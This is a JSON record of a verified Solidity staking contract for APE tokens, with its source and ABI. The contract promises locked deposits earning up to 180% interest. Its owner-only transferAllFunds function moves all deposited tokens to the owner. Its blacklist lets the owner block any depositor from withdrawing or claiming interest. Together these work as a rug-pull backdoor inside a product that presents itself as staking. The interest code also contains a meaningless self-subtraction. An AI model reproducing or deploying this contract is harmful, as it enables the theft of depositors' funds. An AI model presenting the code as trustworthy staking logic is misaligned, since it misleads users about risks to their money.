{
  "TxHash": "0x9ed9f5854af4d790243cfd1d2d845b59871b3153ac496a6807a363c0dae95286",
  "ContractAddress": "0x396300256e7be0eb227a6f0e1b47c0f56f426295",
  "Name": "APEStakingContract",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-05-15\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\nstruct DepositInfo {\r\n    uint256 amount;\r\n    uint256 lockupPeriod;\r\n    uint256 interestRate;\r\n    uint256 depositTime;\r\n    uint256 lastClaimTime;\r\n}\r\n\r\ncontract APEStakingContract {\r\n    address payable private _owner;\r\n    IERC20 private _token;\r\n    \r\n    constructor() {\r\n        _owner = payable(msg.sender);\r\n        _token = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381); // \"APE\" token address\r\n    }\r\n    \r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e uint256) private _lastClaimTime;\r\n    mapping(address =\u003e uint256) private _lockupPeriod;\r\n    mapping(address =\u003e uint256) private _interestRate;\r\n    mapping(address =\u003e bool) private _blacklisted;\r\n    mapping(address =\u003e address) private _referrals;\r\n    mapping(address =\u003e uint256) private _initialDeposits;\r\n    mapping(address =\u003e uint256) private _depositTime;\r\n    mapping(address =\u003e DepositInfo[]) private _deposits;\r\n    mapping(address =\u003e uint256) private _totalWithdrawnAmounts;\r\n    \r\n    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event InterestClaimed(address indexed user, uint256 amount);\r\n    event Blacklisted(address indexed user);\r\n    event Unblacklisted(address indexed user);\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == _owner, \"Not the contract owner.\");\r\n        _;\r\n    }\r\n\r\n\r\n     function deposit(uint256 amount, uint256 lockupPeriod, address referral) external {\r\n         require(amount \u003e 0, \"Amount must be greater than 0.\");\r\n         require(lockupPeriod \u003e= 1 \u0026\u0026 lockupPeriod \u003c= 5, \"Invalid lockup period.\");\r\n         require(!_blacklisted[msg.sender], \"You are not allowed to deposit.\");\r\n         require(_token.allowance(msg.sender, address(this)) \u003e= amount, \"Token allowance not sufficient.\");\r\n\r\n        uint256 currentLockupPeriod = lockupPeriod * 1 days;\r\n        uint256 currentInterestRate;\r\n\r\nif (lockupPeriod == 1) {\r\n    currentLockupPeriod = 14 * 1 days;\r\n    require(amount \u003e= 2 * 10**21 \u0026\u0026 amount \u003c= 5 * 10**21, \"Invalid deposit amount for 14-day lockup.\");\r\n    currentInterestRate = 500; // 5%\r\n} else if (lockupPeriod == 2) {\r\n    currentLockupPeriod = 30 * 1 days;\r\n    require(amount \u003e= 3 * 10**21 \u0026\u0026 amount \u003c= 8 * 10**21, \"Invalid deposit amount for 30-day lockup.\");\r\n    currentInterestRate = 1100; // 11%\r\n} else if (lockupPeriod == 3) {\r\n    currentLockupPeriod = 60 * 1 days;\r\n    require(amount \u003e= 5 * 10**21 \u0026\u0026 amount \u003c= 12 * 10**21, \"Invalid deposit amount for 60-day lockup.\");\r\n    currentInterestRate = 2400; // 24%\r\n} else if (lockupPeriod == 4) {\r\n    currentLockupPeriod = 90 * 1 days;\r\n    require(amount \u003e= 8 * 10**21 \u0026\u0026 amount \u003c= 3 * 10**22, \"Invalid deposit amount for 90-day lockup.\");\r\n    currentInterestRate = 3600; // 36%\r\n} else if (lockupPeriod == 5) {\r\n    currentLockupPeriod = 365 * 1 days;\r\n    require(amount \u003e= 15 * 10**21 \u0026\u0026 amount \u003c= 5 * 10**22, \"Invalid deposit amount for 365-day lockup.\");\r\n    currentInterestRate = 18000; // 180%\r\n}\r\n\r\n    if (_referrals[msg.sender] == address(0) \u0026\u0026 referral != msg.sender \u0026\u0026 referral != address(0)) {\r\n        _referrals[msg.sender] = referral;\r\n    }\r\n\r\n       DepositInfo memory newDeposit = DepositInfo({\r\n            amount: amount,\r\n            lockupPeriod: currentLockupPeriod,\r\n            interestRate: currentInterestRate,\r\n            depositTime: block.timestamp,\r\n            lastClaimTime: block.timestamp\r\n        });\r\n\r\n    _balances[msg.sender] += amount;\r\n    _lockupPeriod[msg.sender] = currentLockupPeriod;\r\n    _interestRate[msg.sender] = currentInterestRate;\r\n    _depositTime[msg.sender] = block.timestamp;\r\n    _lastClaimTime[msg.sender] = block.timestamp;\r\n    _initialDeposits[msg.sender] = amount;\r\n    _deposits[msg.sender].push(newDeposit);\r\n    _token.transferFrom(msg.sender, address(this), amount);\r\n\r\n    emit Deposit(msg.sender, amount, lockupPeriod);\r\n}\r\n\r\n\r\n    function blacklist(address user) external onlyOwner {\r\n        require(!_blacklisted[user], \"User is already blacklisted.\");\r\n        _blacklisted[user] = true;\r\n\r\n        emit Blacklisted(user);\r\n    }\r\n\r\n    function unblacklist(address user) external onlyOwner {\r\n        require(_blacklisted[user], \"User is not blacklisted.\");\r\n        _blacklisted[user] = false;\r\n\r\n        emit Unblacklisted(user);\r\n    }\r\n\r\nfunction withdraw(uint256 depositIndex) external {\r\n    require(!_blacklisted[msg.sender], \"You are not allowed to withdraw.\");\r\n    require(depositIndex \u003c _deposits[msg.sender].length, \"Invalid deposit index.\");\r\n    require(block.timestamp \u003e= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, \"Lockup period not over.\");\r\n    \r\n    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;\r\n    require(amountToWithdraw \u003e 0, \"No funds to withdraw.\");\r\n\r\n    _deposits[msg.sender][depositIndex].amount = 0;\r\n    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount\r\n    _token.transfer(msg.sender, amountToWithdraw); \r\n\r\n    emit Withdraw(msg.sender, amountToWithdraw);\r\n}\r\n\r\nfunction transferAllFunds() external onlyOwner {\r\n    uint256 contractBalance = _token.balanceOf(address(this));\r\n    require(contractBalance \u003e 0, \"No funds to transfer.\");\r\n    _token.transfer(_owner, contractBalance);\r\n}\r\n\r\n    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {\r\n        DepositInfo storage deposit = _deposits[user][depositIndex];\r\n        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;\r\n        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;\r\n        uint256 interest = (deposit.amount * deposit.interestRate * timeElapsed) / (10000 * 86400); // 86400 seconds in a day\r\n        return interest + interestClaimed;\r\n    }\r\n\r\nfunction claimInterestForDeposit(uint256 lockupPeriod) external {\r\n    require(!_blacklisted[msg.sender], \"You are not allowed to claim interest.\");\r\n\r\n    uint256 totalInterestToClaim = 0;\r\n\r\n        for (uint256 i = 0; i \u003c _deposits[msg.sender].length; i++) {\r\n            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {\r\n            uint256 interestToClaim = calculateInterest(msg.sender, i);\r\n            require(interestToClaim \u003e 0, \"No interest to claim.\");\r\n\r\n            _deposits[msg.sender][i].lastClaimTime = block.timestamp;\r\n            totalInterestToClaim += interestToClaim;\r\n        }\r\n    }\r\n\r\n    _token. transfer(msg. sender, totalInterestToClaim);\r\n\r\n    emit InterestClaimed(msg.sender, totalInterestToClaim);\r\n}\r\n\r\nfunction getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {\r\n     uint256 depositCount = _deposits[user].length;\r\n\r\n     depositIndices = new uint256[](depositCount);\r\n     unlockTimes = new uint256[](depositCount);\r\n     stakedAmounts = new uint256[](depositCount);\r\n     lockupPeriods = new uint256[](depositCount);\r\n\r\n     for (uint256 i = 0; i \u003c depositCount; i++) {\r\n         depositIndices[i] = i;\r\n         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;\r\n         stakedAmounts[i] = _deposits[user][i].amount;\r\n         lockupPeriods[i] = _deposits[user][i].lockupPeriod;\r\n     }\r\n }\r\n\r\nfunction max(int256 a, int256 b) private pure returns (int256) {\r\n    return a \u003e= b ? a : b;\r\n}\r\n\r\n    function getReferral(address user) external view returns (address) {\r\n        return _referrals[user];\r\n    }\r\n\r\n    function isBlacklisted(address user) external view returns (bool) {\r\n        return _blacklisted[user];\r\n    }\r\n\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Blacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"InterestClaimed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Unblacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"blacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"depositIndex\",\"type\":\"uint256\"}],\"name\":\"calculateInterest\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"}],\"name\":\"claimInterestForDeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lockupPeriod\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getDepositInfo\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"depositIndices\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"unlockTimes\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"stakedAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"lockupPeriods\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getReferral\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferAllFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"unblacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"depositIndex\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
      "ContractName": "APEStakingContract",
      "CompilerVersion": "v0.8.26+commit.8a97fa7a",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://dff0237f9bb4b5ea990d24bd244eb568a108c07e1d7614a5f4697991e8e0eb8d"
    }
  ]
}
